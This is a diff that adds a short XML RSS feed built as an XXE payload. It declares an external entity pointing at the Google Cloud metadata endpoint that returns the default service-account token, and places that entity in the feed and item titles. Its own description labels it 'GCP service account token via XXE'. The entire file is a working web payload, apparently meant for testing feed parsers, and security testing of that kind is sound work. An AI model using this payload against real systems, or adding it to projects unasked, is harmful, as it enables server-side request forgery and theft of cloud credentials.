@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE rss [
+  <!ENTITY xxe SYSTEM "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token">
+]>
+<rss version="2.0">
+  <channel>
+    <title>&xxe;</title>
+    <link>https://example.com</link>
+    <description>GCP service account token via XXE</description>
+    <item>
+      <title>&xxe;</title>
+      <link>https://example.com/item</link>
+    </item>
+  </channel>
+</rss>
